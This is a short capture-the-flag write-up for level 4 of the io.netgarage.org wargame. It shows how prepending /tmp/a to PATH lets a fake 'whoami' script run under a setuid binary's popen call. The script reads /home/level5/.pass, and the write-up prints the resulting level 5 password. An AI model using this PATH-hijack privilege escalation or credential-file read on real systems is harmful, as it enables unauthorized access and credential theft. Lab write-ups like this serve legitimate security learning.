---

title: Level 4
link: ssh level4@io.netgarage.org

---

The code for this one is straightforward and only call a system command with the `popen` function, reads its input and display it.

Under a shell, the binaries are found by searching the `PATH` variable until one executable file with the desired name is found.
Let's try if this works:

    $ cd /tmp
    /tmp$ mkdir a && cd a
    /tmp/a$ vi ls

    #!/bin/sh
    echo "A"

    /tmp/a$ chmod u+x ls
    /tmp/a$ export PATH="/tmp/a:$PATH"
    /tmp/a$ ls
    A

We can then modify any command, in our case, the `whoami`:


    /tmp/a$ cat whoami
    #!/bin/sh

    cat /home/level5/.pass

And then

    /levels$ ./level04
    Welcome DNLM3Vu0mZfX0pDd

Level 5 password: `DNLM3Vu0mZfX0pDd`
